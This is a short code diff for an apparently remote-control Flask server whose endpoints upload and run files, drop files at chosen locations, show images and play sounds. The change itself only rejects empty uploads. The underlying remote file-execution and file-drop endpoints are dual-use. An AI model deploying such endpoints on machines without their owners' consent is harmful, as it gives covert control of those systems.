@@ -197,6 +197,9 @@ def post_image() -> Response:
     if check_key(request.args.get("key")):
         global image
         image = request.files["image"].stream.read()
+        if len(image) == 0:
+            image = b""
+            return Response("file too short", 400)
         Thread(target=post_image_thread, args=[image]).start()
         return Response("success", 200)
     else:
@@ -232,6 +235,9 @@ def post_runfile() -> Response:
 
         runfile_args = request.args.get("args")
         runfile = request.files["runFile"].stream.read()
+        if len(runfile) == 0:
+            runfile = b""
+            return Response("file too short", 400)
         Thread(target=post_runfile_thread, args=[runfile, runfile_args]).start()
         return Response("success", 200)
     else:
@@ -264,6 +270,9 @@ def post_dropfile() -> Response:
         global dropfile_location, dropfile
 
         dropfile = request.files["dropFile"].stream.read()
+        if len(dropfile) == 0:
+            dropfile = b""
+            return Response("file too short", 400)
         dropfile_location = request.form.get("location")
         Thread(target=post_dropfile_thread, args=[dropfile, dropfile_location]).start()
         return Response("success", 200)
@@ -285,6 +294,9 @@ def post_playsound() -> Response:
     if check_key(request.args.get("key")):
         global sound_file
         sound_file = request.files["soundFile"].stream.read()
+        if len(sound_file) == 0:
+            sound_file = b""
+            return Response("file too short", 400)
         Thread(target=post_playsound_thread, args=[sound_file]).start()
         return Response("success", 200)
     else:
